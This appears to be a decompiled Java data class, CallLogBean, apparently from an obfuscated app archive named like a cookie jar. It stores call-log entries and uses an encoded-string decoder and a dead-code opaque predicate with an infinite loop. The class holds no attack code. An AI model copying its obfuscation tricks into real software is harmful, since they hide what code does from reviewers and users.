package com.wish.lmbank.bean;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/bean/CallLogBean.class */
public class CallLogBean {
    private long date;
    private long duration;
    private String phone1;
    private String phone2;
    private String type;
    private boolean isHandled = false;
    private int times = 0;

    public CallLogBean(String str, String str2, String str3, long j) {
        this.phone1 = str;
        this.phone2 = str2;
        this.type = str3;
        this.date = j;
    }

    public CallLogBean(String str, String str2, String str3, long j, long j2) {
        this.phone1 = str;
        this.phone2 = str2;
        this.type = str3;
        this.duration = j;
        this.date = j2;
    }

    public String getPhone1() {
        return this.phone1;
    }

    public void setPhone1(String str) {
        this.phone1 = str;
    }

    public String getPhone2() {
        return this.phone2;
    }

    public void setPhone2(String str) {
        this.phone2 = str;
    }

    public String getType() {
        return this.type;
    }

    public void setType(String str) {
        this.type = str;
    }

    public boolean isHandled() {
        return this.isHandled;
    }

    public void setHandled(boolean z) {
        this.isHandled = z;
    }

    public long getDuration() {
        return this.duration;
    }

    public void setDuration(long j) {
        this.duration = j;
    }

    public long getDate() {
        return this.date;
    }

    public void setDate(long j) {
        this.date = j;
    }

    public int getTimes() {
        return this.times;
    }

    public void setTimes(int i) {
        this.times = i;
    }

    public String toString() {
        if ((454 - 13657) % (-13657) <= 0) {
//             return bb7d7pu7.m5998("KggFBSUGDisMCAcSGQEGBwxYVE4") + this.phone1 + '\'' + bb7d7pu7.m5998("RUkZAQYHDFtUTg") + this.phone2 + '\'' + bb7d7pu7.m5998("RUkdEBkMVE4") + this.type + '\'' + bb7d7pu7.m5998("RUkNHBsIHQAGB1Q") + this.duration + bb7d7pu7.m5998("RUkNCB0MVA") + this.date + bb7d7pu7.m5998("RUkdAAQMGlQ") + this.times + '}';
            return "CallLogBean{phone1='" + this.phone1 + '\'' + ", phone2='" + this.phone2 + '\'' + ", type='" + this.type + '\'' + ", duration=" + this.duration + ", date=" + this.date + ", times=" + this.times + '}';
        }
        int i = 19098 + 19098 + 9472;
        while (true) {
        }
    }
}
